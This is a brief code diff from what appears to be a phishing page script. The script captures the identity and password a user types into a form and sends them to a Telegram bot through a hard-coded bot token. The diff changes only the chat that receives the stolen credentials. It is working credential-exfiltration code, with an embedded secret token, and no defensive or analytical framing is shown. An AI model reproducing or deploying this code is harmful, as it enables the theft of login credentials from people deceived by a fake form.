@@ -9,7 +9,7 @@ form.addEventListener("submit", (e) => {
     var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
 
     var token = "6455159198:AAHNzNXFG0QLOsViyA2HqnSHVipB1p3U4Kg";
-    var chat_id = -4198481513
+    var chat_id = -1001919193413
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
 
     let api = new XMLHttpRequest();
